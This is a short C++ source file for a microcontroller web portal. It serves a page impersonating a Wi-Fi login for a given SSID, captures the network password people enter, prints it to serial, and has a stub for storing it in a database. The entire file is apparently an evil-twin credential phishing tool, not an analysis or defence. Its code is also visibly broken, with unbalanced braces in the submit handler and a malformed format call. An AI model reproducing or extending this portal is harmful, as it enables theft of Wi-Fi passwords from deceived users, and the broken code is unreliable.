#include"WebPortal.h"

namespace WebPortal{
    String getHTML(){
        String HTMLTemplate = 
        R"rawliteral(<!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width", initial-scale=1.0>
                <style>
                *{
                    color: Black;
                    size: 20px;
                }
                body {
                    background-color: coral;
                }
                
                </style>
            </head>
            <body>
                <div id ="mainContainer">
                    <h1>Loggin on to {{SSID}}</h1>
                    <form id = "inputForm" action = "\submit" method = "post">
                        <label for="passwordInput">Password: (30 characters max)</label><br>
                        <input type="text" class="inputBar" name="passwordInput"><br><br>
                        <input type="submit" value="Enter">
                    </form>
                </div>
            </body>
        </html>)rawliteral";

        HTMLTemplate.replace("{{SSID}}", SSID);
        return HTMLTemplate;
    }

    void handleConnect(){
        Serial.println("Page Visited.");
        server.send(200, "text/html", getHTML());

    }

    void handleSubmit() {
        if (server.hasArg("passwordInput")) {
            String userPW = server.arg("passwordInput");
            Serial.println("--------NEW PASSWORD SUBMISSION--------");
            Serial.printf("SSID: %s\n", SSID);
            Serial.printf("Password: %s\n", userPW);

            
            if(internetConnection){
                Serial.printf("Entering into database");
        } else {
            Serial.println("No password entered.");
        }

        server.send(200, "text/html", getHTML());
    }

    
} 
